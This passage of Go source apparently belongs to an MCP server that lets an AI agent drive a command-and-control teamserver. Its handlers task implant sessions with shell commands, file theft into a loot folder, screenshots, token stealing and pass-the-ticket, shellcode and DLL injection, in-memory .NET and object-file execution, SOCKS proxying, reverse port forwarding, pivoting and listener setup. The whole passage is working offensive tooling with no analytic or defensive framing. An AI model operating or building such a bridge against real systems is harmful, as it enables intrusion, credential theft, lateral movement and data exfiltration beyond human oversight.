			"sent_at":        task.SentAt.Format("2006-01-02 15:04:05"),
		},
		"output": map[string]any{
			"events":      events,
			"next_cursor": page.NextCursor,
			"truncated":   page.Truncated,
		},
	}, nil
}

func (s *Server) handleSendCommand(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string         `json:"session_id"`
		Command   string         `json:"command"`
		Args      map[string]any `json:"args"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	var req operator.TaskRequest
	switch params.Command {
	case "shell":
		cmd, _ := params.Args["command"].(string)
		if cmd == "" {
			return nil, fmt.Errorf("shell requires a command")
		}
		req = operator.ShellTask(params.SessionID, cmd)
	case "powershell":
		cmd, _ := params.Args["command"].(string)
		if cmd == "" {
			return nil, fmt.Errorf("powershell requires a command")
		}
		req = operator.PowerShellTask(params.SessionID, cmd)
	case "dir", "ls":
		opts := operator.DirOptions{
			Path:      getString(params.Args, "path", "."),
			Recursive: getBool(params.Args, "recursive"),
			FilesOnly: getBool(params.Args, "files_only"),
			DirsOnly:  getBool(params.Args, "dirs_only"),
			ListOnly:  getBool(params.Args, "list_only"),
			Starts:    getString(params.Args, "starts", ""),
			Contains:  getString(params.Args, "contains", ""),
			Ends:      getString(params.Args, "ends", ""),
		}
		if opts.FilesOnly && opts.DirsOnly {
			return nil, fmt.Errorf("dir cannot set both files_only and dirs_only")
		}
		req = operator.DirTask(params.SessionID, opts)
	case "cd":
		path, _ := params.Args["path"].(string)
		if path == "" {
			return nil, fmt.Errorf("cd requires a path")
		}
		req = operator.CdTask(params.SessionID, path)
	case "cp":
		source := getString(params.Args, "source", "")
		destination := getString(params.Args, "destination", "")
		if source == "" || destination == "" {
			return nil, fmt.Errorf("cp requires source and destination")
		}
		req = operator.CpTask(params.SessionID, source, destination)
	case "mv", "move":
		source := getString(params.Args, "source", "")
		destination := getString(params.Args, "destination", "")
		if source == "" || destination == "" {
			return nil, fmt.Errorf("%s requires source and destination", params.Command)
		}
		req = operator.MvTask(params.SessionID, source, destination)
	case "remove", "rm":
		path := getString(params.Args, "path", "")
		if path == "" {
			return nil, fmt.Errorf("%s requires a path", params.Command)
		}
		req = operator.RemoveTask(params.SessionID, path)
	case "mkdir":
		path := getString(params.Args, "path", "")
		if path == "" {
			return nil, fmt.Errorf("mkdir requires a path")
		}
		req = operator.MkdirTask(params.SessionID, path)
	case "pwd":
		req = operator.PwdTask(params.SessionID)
	case "cat", "type":
		path, _ := params.Args["path"].(string)
		if path == "" {
			return nil, fmt.Errorf("%s requires a path", params.Command)
		}
		req = operator.CatTask(params.SessionID, path)
	case "upload":
		localPath := getString(params.Args, "path", "")
		if localPath == "" {
			return nil, fmt.Errorf("upload requires a local path")
		}
		content, err := os.ReadFile(localPath)
		if err != nil {
			return nil, fmt.Errorf("read upload file: %w", err)
		}
		remotePath := getString(params.Args, "remote_path", "")
		if remotePath == "" {
			remotePath = filepath.Base(localPath)
		} else if strings.HasSuffix(remotePath, "\\") {
			remotePath += filepath.Base(localPath)
		}
		req = operator.UploadTask(params.SessionID, remotePath, base64.StdEncoding.EncodeToString(content))
		req.CommandLine = fmt.Sprintf("upload %s %s", localPath, remotePath)
	case "download":
		path, _ := params.Args["path"].(string)
		if path == "" {
			return nil, fmt.Errorf("download requires a path")
		}
		req = operator.DownloadTask(params.SessionID, path)
	case "ps":
		req = operator.PsTask(params.SessionID)
	case "kill":
		pid := getInt(params.Args, "pid")
		if pid <= 0 {
			return nil, fmt.Errorf("kill requires a positive pid")
		}
		req = operator.KillTask(params.SessionID, pid)
	case "sleep":
		delay := getInt(params.Args, "delay")
		jitter := getInt(params.Args, "jitter")
		if delay < 0 {
			return nil, fmt.Errorf("sleep delay cannot be negative")
		}
		if jitter < 0 || jitter > 100 {
			return nil, fmt.Errorf("sleep jitter must be between 0 and 100")
		}
		req = operator.SleepTask(params.SessionID, delay, jitter)
	case "interactive":
		req = operator.InteractiveTask(params.SessionID)
	case "exit":
		method, _ := params.Args["method"].(string)
		if method != "thread" && method != "process" {
			return nil, fmt.Errorf("exit requires method thread or process")
		}
		req = operator.ExitTask(params.SessionID, method)
	case "jobs":
		req = operator.JobsTask(params.SessionID)
	case "config":
		key := getString(params.Args, "key", "")
		value := getString(params.Args, "value", "")
		if key == "" || value == "" {
			return nil, fmt.Errorf("config requires key and value")
		}
		req = operator.ConfigTask(params.SessionID, key, value)
	case "luid":
		req = operator.LuidTask(params.SessionID)
	case "klist":
		argument1 := getString(params.Args, "argument1", "/all")
		argument2 := getString(params.Args, "argument2", "")
		if argument1 != "/all" && argument1 != "/luid" {
			return nil, fmt.Errorf("klist requires argument1 /all or /luid")
		}
		if argument1 == "/luid" && argument2 == "" {
			return nil, fmt.Errorf("klist /luid requires argument2")
		}
		req = operator.KlistTask(params.SessionID, argument1, argument2)
	case "purge":
		luid := getString(params.Args, "luid", "")
		if luid == "" {
			return nil, fmt.Errorf("purge requires a luid")
		}
		req = operator.PurgeTask(params.SessionID, luid)
	case "ptt":
		ticket := getString(params.Args, "ticket", "")
		luid := getString(params.Args, "luid", "")
		if ticket == "" {
			return nil, fmt.Errorf("ptt requires a base64-encoded ticket")
		}
		if _, err := base64.StdEncoding.DecodeString(ticket); err != nil {
			return nil, fmt.Errorf("ptt ticket must be base64-encoded: %w", err)
		}
		req = operator.PttTask(params.SessionID, ticket, luid)
	case "getprivs":
		req = operator.TokenTask(params.SessionID, operator.TokenOptions{SubCommand: "privs-list"})
	case "whoami":
		req = operator.ShellTask(params.SessionID, "whoami")
	case "ipconfig":
		req = operator.ShellTask(params.SessionID, "ipconfig /all")
	case "sysinfo":
		req = operator.ShellTask(params.SessionID, "systeminfo")
	case "env":
		req = operator.ShellTask(params.SessionID, "set")
	default:
		return nil, fmt.Errorf("unknown command: %s", params.Command)
	}

	if params.SessionID == "" {
		return nil, fmt.Errorf("session_id is required")
	}
	if req.Info == nil {
		return nil, fmt.Errorf("command did not produce task info")
	}

	task, err := s.opClient.SendTask(req)
	if err != nil {
		return nil, err
	}

	return map[string]any{
		"task_id": task.TaskID,
		"cursor":  task.CursorAtSend,
	}, nil
}

func (s *Server) handleSendRawCommand(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID   string            `json:"session_id"`
		CommandID   json.RawMessage   `json:"command_id"`
		Info        map[string]string `json:"info"`
		CommandLine string            `json:"command_line"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}
	if params.SessionID == "" {
		return nil, fmt.Errorf("session_id is required")
	}
	if len(params.CommandID) == 0 || string(params.CommandID) == "null" {
		return nil, fmt.Errorf("command_id is required")
	}
	if params.Info == nil {
		return nil, fmt.Errorf("info is required")
	}

	// Parse command_id (can be int or string)
	var commandID any
	if err := json.Unmarshal(params.CommandID, &commandID); err != nil {
		return nil, fmt.Errorf("invalid command_id: %w", err)
	}

	req := operator.SendRawCommandTask(params.SessionID, commandID, params.Info, params.CommandLine)
	task, err := s.opClient.SendTask(req)
	if err != nil {
		return nil, err
	}

	return map[string]any{
		"task_id": task.TaskID,
		"cursor":  task.CursorAtSend,
	}, nil
}

// sendTaskAndWait sends a curated task and waits for its first output event.
// The output stream is team-wide, so callers must still treat events as
// untrusted and potentially produced by another operator.
func (s *Server) sendTaskAndWait(ctx context.Context, req operator.TaskRequest) (map[string]any, error) {
	if req.SessionID == "" {
		return nil, fmt.Errorf("session_id is required")
	}
	if req.Info == nil {
		return nil, fmt.Errorf("task request is missing command info")
	}

	task, err := s.opClient.SendTask(req)
	if err != nil {
		return nil, err
	}

	page := s.opClient.WaitOutput(ctx, task.SessionID, task.CursorAtSend, 30*time.Second)
	events := make([]map[string]any, len(page.Events))
	for i, event := range page.Events {
		events[i] = outputEventMap(event)
	}

	nextCursor := page.NextCursor
	if nextCursor == 0 {
		nextCursor = task.CursorAtSend
	}

	return map[string]any{
		"task_id":     task.TaskID,
		"cursor":      task.CursorAtSend,
		"events":      events,
		"next_cursor": nextCursor,
		"truncated":   page.Truncated,
		"timed_out":   len(events) == 0,
	}, nil
}

// outputEventMap converts an operator event to the MCP output shape. Screenshot
// envelopes are split into a payload field and metadata; their bytes are never
// copied into the text field.
func outputEventMap(event operator.OutputEvent) map[string]any {
	result := map[string]any{
		"seq":        event.Seq,
		"time":       event.Time,
		"command_id": event.CommandID,
		"text":       event.Text,
		"task_id":    event.TaskID,
	}

	var envelope map[string]any
	if err := json.Unmarshal([]byte(event.Text), &envelope); err != nil {
		return result
	}
	if miscType, _ := envelope["MiscType"].(string); miscType != "screenshot" {
		return result
	}

	text, _ := envelope["Message"].(string)
	if text == "" {
		text, _ = envelope["Output"].(string)
	}
	result["text"] = text

	if payload, _ := envelope["MiscData"].(string); payload != "" {
		result["payload_b64"] = payload
		decoded, err := base64.StdEncoding.DecodeString(payload)
		if err == nil {
			result["payload_size"] = len(decoded)
		} else {
			result["payload_size"] = 0
		}
	}

	name, _ := envelope["MiscData2"].(string)
	extension := filepath.Ext(name)
	if extension == "" {
		extension = ".bmp"
	}
	result["file_extension"] = extension
	result["content_type"] = "image/bmp"

	return result
}

func (s *Server) sendTaskAndWaitUntil(ctx context.Context, req operator.TaskRequest, match func(operator.OutputEvent) bool) (map[string]any, error) {
	if req.SessionID == "" {
		return nil, fmt.Errorf("session_id is required")
	}
	if req.Info == nil {
		return nil, fmt.Errorf("task request is missing command info")
	}

	task, err := s.opClient.SendTask(req)
	if err != nil {
		return nil, err
	}

	matched := false
	page := s.opClient.WaitOutputUntil(ctx, task.SessionID, task.CursorAtSend, 30*time.Second, func(event operator.OutputEvent) bool {
		if match != nil && match(event) {
			matched = true
			return true
		}
		return false
	})
	events := make([]map[string]any, len(page.Events))
	for i, event := range page.Events {
		events[i] = outputEventMap(event)
	}

	nextCursor := page.NextCursor
	if nextCursor == 0 {
		nextCursor = task.CursorAtSend
	}

	return map[string]any{
		"task_id":     task.TaskID,
		"cursor":      task.CursorAtSend,
		"events":      events,
		"next_cursor": nextCursor,
		"truncated":   page.Truncated,
		"timed_out":   !matched,
	}, nil
}

func (s *Server) handleScreenshot(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	return s.sendTaskAndWait(ctx, operator.ScreenshotTask(params.SessionID))
}

func (s *Server) handleSocks(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		Action    string `json:"action"`
		Param     string `json:"param"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	switch params.Action {
	case "add":
		if params.Param == "" {
			return nil, fmt.Errorf("socks add requires a port")
		}
	case "list", "clear":
	case "kill":
		if params.Param == "" {
			return nil, fmt.Errorf("socks kill requires a proxy id")
		}
	default:
		return nil, fmt.Errorf("unknown socks action: %s", params.Action)
	}

	return s.sendTaskAndWait(ctx, operator.SocksTask(params.SessionID, params.Action, params.Param))
}

func (s *Server) handleRportfwd(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		Action    string `json:"action"`
		BindHost  string `json:"bind_host"`
		BindPort  int    `json:"bind_port"`
		Host      string `json:"host"`
		Port      int    `json:"port"`
		SocketID  string `json:"socket_id"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	opts := operator.RportfwdOptions{
		Action:   params.Action,
		BindHost: params.BindHost,
		BindPort: params.BindPort,
		Host:     params.Host,
		Port:     params.Port,
		SocketID: params.SocketID,
	}
	switch params.Action {
	case "add":
		if params.BindHost == "" || params.BindPort <= 0 || params.BindPort > 65535 ||
			params.Host == "" || params.Port <= 0 || params.Port > 65535 {
			return nil, fmt.Errorf("rportfwd add requires bind_host, a valid bind_port, host, and a valid port")
		}
	case "list", "clear":
	case "remove":
		if params.SocketID == "" {
			return nil, fmt.Errorf("rportfwd remove requires a socket id")
		}
	default:
		return nil, fmt.Errorf("unknown rportfwd action: %s", params.Action)
	}

	return s.sendTaskAndWait(ctx, operator.RportfwdTask(params.SessionID, opts))
}

func (s *Server) handleToken(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID  string `json:"session_id"`
		Subcommand string `json:"subcommand"`
		TokenID    string `json:"token_id"`
		ProcessID  int    `json:"process_id"`
		Handle     string `json:"handle"`
		Domain     string `json:"domain"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		LogonType  string `json:"logon_type"`
		Privilege  string `json:"privilege"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	opts := operator.TokenOptions{
		SubCommand: params.Subcommand,
		TokenID:    params.TokenID,
		ProcessID:  params.ProcessID,
		Handle:     params.Handle,
		Domain:     params.Domain,
		Username:   params.Username,
		Password:   params.Password,
		LogonType:  params.LogonType,
		Privilege:  params.Privilege,
	}

	switch params.Subcommand {
	case "impersonate", "remove":
		if params.TokenID == "" {
			return nil, fmt.Errorf("token %s requires a token id", params.Subcommand)
		}
	case "steal":
		if params.ProcessID <= 0 {
			return nil, fmt.Errorf("token steal requires a process id")
		}
	case "make":
		if params.Domain == "" || params.Username == "" || params.Password == "" {
			return nil, fmt.Errorf("token make requires domain, username, and password")
		}
		switch params.LogonType {
		case "", "LOGON_INTERACTIVE", "LOGON_NETWORK", "LOGON_BATCH", "LOGON_SERVICE",
			"LOGON_UNLOCK", "LOGON_NETWORK_CLEARTEXT", "LOGON_NEW_CREDENTIALS":
		default:
			return nil, fmt.Errorf("token make has unknown logon type: %s", params.LogonType)
		}
	case "privs-get":
		if params.Privilege == "" {
			return nil, fmt.Errorf("token privs-get requires a privilege")
		}
	case "list", "find", "revert", "clear", "getuid", "privs-list":
	default:
		return nil, fmt.Errorf("unknown token subcommand: %s", params.Subcommand)
	}

	return s.sendTaskAndWait(ctx, operator.TokenTask(params.SessionID, opts))
}

func (s *Server) handleShellcode(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		Action    string `json:"action"`
		Arch      string `json:"arch"`
		PID       int    `json:"pid"`
		FilePath  string `json:"file_path"`
		Arguments string `json:"args"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	switch params.Action {
	case "inject", "spawn", "execute":
	default:
		return nil, fmt.Errorf("unknown shellcode action: %s", params.Action)
	}
	if params.Arch != "x64" && params.Arch != "x86" {
		return nil, fmt.Errorf("shellcode requires arch x64 or x86")
	}

	content, err := readTaskFile(params.FilePath, "shellcode")
	if err != nil {
		return nil, err
	}
	if params.Action == "inject" && params.PID <= 0 {
		return nil, fmt.Errorf("shellcode inject requires a pid")
	}

	req := operator.ShellcodeTask(params.SessionID, params.Action, params.Arch, params.PID, content, params.Arguments, params.FilePath)
	return s.sendTaskAndWait(ctx, req)
}

func (s *Server) handleDotnet(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID    string `json:"session_id"`
		Action       string `json:"action"`
		AssemblyPath string `json:"assembly_path"`
		Arguments    string `json:"args"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	var content []byte
	switch params.Action {
	case "inline-execute":
		var err error
		content, err = readTaskFile(params.AssemblyPath, ".NET assembly")
		if err != nil {
			return nil, err
		}
	case "list-versions":
	default:
		return nil, fmt.Errorf("unknown dotnet action: %s", params.Action)
	}

	req := operator.DotnetTask(params.SessionID, params.Action, content, params.Arguments, params.AssemblyPath)
	return s.sendTaskAndWait(ctx, req)
}

func (s *Server) handleInlineExecute(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		BOFPath   string `json:"bof_path"`
		Arguments string `json:"args"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	content, err := readTaskFile(params.BOFPath, "object file")
	if err != nil {
		return nil, err
	}

	req := operator.InlineExecuteTask(params.SessionID, content, params.Arguments, params.BOFPath)
	return s.sendTaskAndWait(ctx, req)
}

func (s *Server) handleDll(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		Action    string `json:"action"`
		PID       int    `json:"pid"`
		FilePath  string `json:"file_path"`
		Arguments string `json:"args"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	switch params.Action {
	case "inject", "spawn":
	default:
		return nil, fmt.Errorf("unknown dll action: %s", params.Action)
	}

	content, err := readTaskFile(params.FilePath, "reflective DLL")
	if err != nil {
		return nil, err
	}
	if params.Action == "inject" && params.PID <= 0 {
		return nil, fmt.Errorf("dll inject requires a pid")
	}

	req := operator.DllTask(params.SessionID, params.Action, content, params.Arguments, params.PID, params.FilePath)
	return s.sendTaskAndWait(ctx, req)
}

func (s *Server) handleDownload(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		Path      string `json:"path"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}
	if params.Path == "" {
		return nil, fmt.Errorf("download requires a path")
	}

	result, err := s.sendTaskAndWaitUntil(ctx, operator.DownloadTask(params.SessionID, params.Path), isDownloadTerminalEvent)
	if err != nil {
		return nil, err
	}

	return s.populateDownloadResult(result, params.SessionID), nil
}

func (s *Server) populateDownloadResult(result map[string]any, sessionID string) map[string]any {
	events, _ := result["events"].([]map[string]any)
	text := ""
	completed := false
	for _, event := range events {
		eventText, _ := event["text"].(string)
		if strings.HasPrefix(eventText, "Finished download of file:") {
			text = eventText
			completed = true
		}
	}
	if text == "" {
		text = firstEventText(events)
	}

	teamserverPath := ""
	if completed {
		remotePath := strings.TrimSpace(strings.TrimPrefix(text, "Finished download of file:"))
		teamserverPath = locateTeamserverDownloadIn(s.cfg.LootRoot, sessionID, remotePath)
	}

	limitation := "The operator WebSocket does not carry downloaded file bytes; retrieve the file from teamserver_path. Path resolution uses --loot-root and requires the MCP process to see the teamserver loot directory."
	if teamserverPath == "" && completed {
		limitation += " The completed artifact was not visible from this MCP process."
	}

	result["text"] = text
	result["teamserver_path"] = teamserverPath
	result["limitation"] = limitation
	result["completed"] = completed
	return result
}

func (s *Server) handleCheckin(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	return s.sendTaskAndWait(ctx, operator.CheckinTask(params.SessionID))
}

func (s *Server) handleJob(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		Action    string `json:"action"`
		JobID     int    `json:"job_id"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}
	switch params.Action {
	case "list":
	case "suspend", "resume", "kill":
		if params.JobID <= 0 {
			return nil, fmt.Errorf("job %s requires a job id", params.Action)
		}
	default:
		return nil, fmt.Errorf("unknown job action: %s", params.Action)
	}

	return s.sendTaskAndWait(ctx, operator.JobTask(params.SessionID, params.Action, params.JobID))
}

func (s *Server) handleProc(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID   string `json:"session_id"`
		Action      string `json:"action"`
		PID         int    `json:"pid"`
		ProcessName string `json:"process_name"`
		State       string `json:"state"`
		Silent      bool   `json:"silent"`
		NoPipe      bool   `json:"no_pipe"`
		Program     string `json:"program"`
		Arguments   string `json:"args"`
		BlockDLL    string `json:"blockdll"`
		Protection  string `json:"protection"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	opts := operator.ProcOptions{
		Action:      params.Action,
		PID:         params.PID,
		ProcessName: params.ProcessName,
		State:       params.State,
		Silent:      params.Silent,
		NoPipe:      params.NoPipe,
		Program:     params.Program,
		Arguments:   params.Arguments,
		BlockDLL:    params.BlockDLL,
		Protection:  params.Protection,
	}
	if opts.State == "" {
		opts.State = "normal"
	}

	switch params.Action {
	case "list":
	case "modules", "kill":
		if params.PID <= 0 {
			return nil, fmt.Errorf("proc %s requires a pid", params.Action)
		}
	case "grep":
		if params.ProcessName == "" {
			return nil, fmt.Errorf("proc grep requires a process name")
		}
	case "create":
		if params.Program == "" {
			return nil, fmt.Errorf("proc create requires a program")
		}
		if opts.State != "normal" && opts.State != "suspended" {
			return nil, fmt.Errorf("proc create requires state normal or suspended")
		}
	case "blockdll":
		if params.BlockDLL != "on" && params.BlockDLL != "off" {
			return nil, fmt.Errorf("proc blockdll requires on or off")
		}
	case "memory":
		if params.PID <= 0 || params.Protection == "" {
			return nil, fmt.Errorf("proc memory requires a pid and protection")
		}
		switch params.Protection {
		case "PAGE_NOACCESS", "PAGE_READONLY", "PAGE_READWRITE", "PAGE_WRITECOPY",
			"PAGE_EXECUTE", "PAGE_EXECUTE_READ", "PAGE_EXECUTE_READWRITE",
			"PAGE_EXECUTE_WRITECOPY", "PAGE_GUARD":
		default:
			return nil, fmt.Errorf("proc memory has unknown protection: %s", params.Protection)
		}
	default:
		return nil, fmt.Errorf("unknown proc action: %s", params.Action)
	}

	return s.sendTaskAndWait(ctx, operator.ProcTask(params.SessionID, opts))
}

func (s *Server) handleSpawn(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		State     string `json:"state"`
		Silent    bool   `json:"silent"`
		NoPipe    bool   `json:"no_pipe"`
		Program   string `json:"program"`
		Arguments string `json:"args"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}
	if params.Program == "" {
		return nil, fmt.Errorf("spawn requires a program")
	}
	if params.State == "" {
		params.State = "normal"
	}
	if params.State != "normal" && params.State != "suspended" {
		return nil, fmt.Errorf("spawn requires state normal or suspended")
	}

	opts := operator.ProcOptions{
		State:     params.State,
		Silent:    params.Silent,
		NoPipe:    params.NoPipe,
		Program:   params.Program,
		Arguments: params.Arguments,
	}
	return s.sendTaskAndWait(ctx, operator.SpawnTask(params.SessionID, opts))
}

func (s *Server) handleTransfer(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		Action    string `json:"action"`
		FileID    string `json:"file_id"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}
	switch params.Action {
	case "list":
	case "stop", "resume", "remove":
		if params.FileID == "" {
			return nil, fmt.Errorf("transfer %s requires a file id", params.Action)
		}
	default:
		return nil, fmt.Errorf("unknown transfer action: %s", params.Action)
	}

	return s.sendTaskAndWait(ctx, operator.TransferTask(params.SessionID, params.Action, params.FileID))
}

func (s *Server) handleNet(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		Action    string `json:"action"`
		Target    string `json:"target"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	switch params.Action {
	case "domain", "logons", "sessions", "share", "localgroup", "group", "users":
	default:
		return nil, fmt.Errorf("unknown net action: %s", params.Action)
	}

	return s.sendTaskAndWait(ctx, operator.NetTask(params.SessionID, params.Action, params.Target))
}

func (s *Server) handlePivot(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		SessionID string `json:"session_id"`
		Action    string `json:"action"`
		Host      string `json:"host"`
		Address   string `json:"address"`
		AgentID   string `json:"agent_id"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}
	switch params.Action {
	case "list":
	case "connect":
		if params.Host == "" || params.Address == "" {
			return nil, fmt.Errorf("pivot connect requires a host and address")
		}
	case "disconnect":
		if params.AgentID == "" {
			return nil, fmt.Errorf("pivot disconnect requires an agent id")
		}
	default:
		return nil, fmt.Errorf("unknown pivot action: %s", params.Action)
	}

	return s.sendTaskAndWait(ctx, operator.PivotTask(params.SessionID, params.Action, params.Host, params.Address, params.AgentID))
}

// readTaskFile reads a local task artifact and returns a useful error instead
// of silently sending an empty binary.
func readTaskFile(path, kind string) ([]byte, error) {
	if path == "" {
		return nil, fmt.Errorf("%s path is required", kind)
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read %s %q: %w", kind, path, err)
	}
	if len(content) == 0 {
		return nil, fmt.Errorf("%s file %q is empty", kind, path)
	}
	return content, nil
}

func isDownloadTerminalEvent(event operator.OutputEvent) bool {
	text := strings.TrimSpace(event.Text)
	if strings.HasPrefix(text, "Finished download of file:") || strings.HasPrefix(text, "Download has been removed:") {
		return true
	}

	lower := strings.ToLower(text)
	return strings.Contains(lower, "download") &&
		(strings.Contains(lower, "failed") || strings.Contains(lower, "error") || strings.Contains(lower, "abort"))
}

func firstEventText(value any) string {
	events, ok := value.([]map[string]any)
	if !ok || len(events) == 0 {
		return ""
	}
	text, _ := events[0]["text"].(string)
	return text
}

// locateTeamserverDownloadIn resolves an existing file below the teamserver's
// agent download directory. Exact normalized paths take precedence over a
// basename fallback; nonexistent candidates are never returned.
func locateTeamserverDownloadIn(root, sessionID, remotePath string) string {
	normalized := strings.TrimLeft(strings.ReplaceAll(remotePath, "\\", "/"), "/")
	if normalized == "" {
		return ""
	}
	expectedBase := normalized
	if index := strings.LastIndex(normalized, "/"); index >= 0 {
		expectedBase = normalized[index+1:]
	}

	entries, err := os.ReadDir(root)
	if err != nil {
		return ""
	}

	var match string
	var matchTime time.Time
	matchScore := 0
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		agentRoot := filepath.Join(root, entry.Name(), "agents")
		downloadRoot := filepath.Join(agentRoot, sessionID, "Download")
		relativeRoot, err := filepath.Rel(agentRoot, downloadRoot)
		if err != nil || relativeRoot == ".." || strings.HasPrefix(relativeRoot, ".."+string(filepath.Separator)) {
			continue
		}

		_ = filepath.WalkDir(downloadRoot, func(path string, item fs.DirEntry, walkErr error) error {
			if walkErr != nil || item.IsDir() {
				return nil
			}

			relative, err := filepath.Rel(downloadRoot, path)
			if err != nil {
				return nil
			}
			relative = strings.TrimPrefix(strings.ReplaceAll(filepath.ToSlash(relative), "\\", "/"), "./")

			// The normal agent download path is nested below Download. The
			// callback download path can instead use the full remote path as
			// one filename, so compare normalized relative paths as well as
			// the final path component.
			score := 0
			switch {
			case strings.EqualFold(relative, normalized):
				score = 2
			case strings.EqualFold(item.Name(), expectedBase):
				score = 1
			default:
				return nil
			}

			info, err := item.Info()
			if err != nil {
				return nil
			}
			if score > matchScore || (score == matchScore && info.ModTime().After(matchTime)) {
				match = path
				matchTime = info.ModTime()
				matchScore = score
			}
			return nil
		})
	}

	if match == "" {
		return ""
	}

	absolute, err := filepath.Abs(match)
	if err != nil {
		return match
	}
	return absolute
}

func getString(m map[string]any, key, def string) string {
	if v, ok := m[key]; ok {
		if s, ok := v.(string); ok {
			return s
		}
	}
	return def
}

func getBool(m map[string]any, key string) bool {
	if v, ok := m[key]; ok {
		if b, ok := v.(bool); ok {
			return b
		}
	}
	return false
}

func getInt(m map[string]any, key string) int {
	if v, ok := m[key]; ok {
		switch val := v.(type) {
		case float64:
			return int(val)
		case int:
			return val
		case string:
			var result int
			fmt.Sscanf(val, "%d", &result)
			return result
		}
	}
	return 0
}

// Listener management handlers (Phase 4)

// stringifyConfig flattens a JSON object into the string map expected by the
// teamserver dispatcher. Array values are joined with ", " because the
// dispatcher splits Hosts, Headers and Uris on that separator.
func stringifyConfig(config map[string]any) map[string]string {
	info := make(map[string]string, len(config))
	for key, value := range config {
		switch v := value.(type) {
		case []any:
			parts := make([]string, len(v))
			for i, item := range v {
				parts[i] = fmt.Sprintf("%v", item)
			}
			info[key] = strings.Join(parts, ", ")
		case []string:
			info[key] = strings.Join(v, ", ")
		default:
			info[key] = fmt.Sprintf("%v", value)
		}
	}
	return info
}

func (s *Server) handleStartListener(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		Name     string         `json:"name"`
		Protocol string         `json:"protocol"`
		Config   map[string]any `json:"config"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	// FIX I3: Normalize protocol to match dispatch.go expectations (e.g., "Http", "Https")
	protoLower := strings.ToLower(params.Protocol)
	normProtocol := protoLower
	if protoLower == "http" {
		normProtocol = "Http"
	} else if protoLower == "https" {
		normProtocol = "Https"
	} else if protoLower == "smb" {
		normProtocol = "Smb"
	} else if protoLower == "external" {
		normProtocol = "External"
	}
	params.Config["Protocol"] = normProtocol

	// FIX I3: Provide safe defaults for HTTP/HTTPS to prevent panics in dispatch.go
	if normProtocol == "Http" || normProtocol == "Https" {
		setDefault := func(key string, val string) {
			if _, ok := params.Config[key]; !ok {
				params.Config[key] = val
			}
		}
		setDefault("HostBind", "0.0.0.0")
		setDefault("Hosts", "127.0.0.1")
		setDefault("Headers", "")
		setDefault("Uris", "/")
		setDefault("HostRotation", "round-robin")
		setDefault("PortBind", "80")
		setDefault("PortConn", "80")
		setDefault("HostHeader", "")
		setDefault("UserAgent", "Mozilla/5.0")
	}

	if err := s.opClient.StartListener(params.Name, normProtocol, stringifyConfig(params.Config)); err != nil {
		return nil, fmt.Errorf("start listener: %w", err)
	}

	return map[string]any{
		"name":     params.Name,
		"protocol": normProtocol,
		"status":   "started",
	}, nil
}

func (s *Server) handleEditListener(ctx context.Context, args json.RawMessage) (any, error) {
	var params struct {
		Name   string         `json:"name"`
		Config map[string]any `json:"config"`
	}
	if err := json.Unmarshal(args, &params); err != nil {
		return nil, err
	}

	// FIX I2: Ensure Protocol is present. If the client didn't send it,
	// we default to "Http" to prevent the teamserver from panicking on type assertion.
	// (A future enhancement could query s.opClient.ListListeners() to infer the true protocol).
	protocol, hasProtocol := params.Config["Protocol"].(string)
	if !hasProtocol || protocol == "" {
		protocol = "Http" // Safe fallback to prevent panic
	}

	// Normalize protocol
	protoLower := strings.ToLower(protocol)
	normProtocol := protoLower
	if protoLower == "http" {
		normProtocol = "Http"
	} else if protoLower == "https" {
		normProtocol = "Https"
	} else if protoLower == "smb" {
		normProtocol = "Smb"
	} else if protoLower == "external" {
		normProtocol = "External"
	}
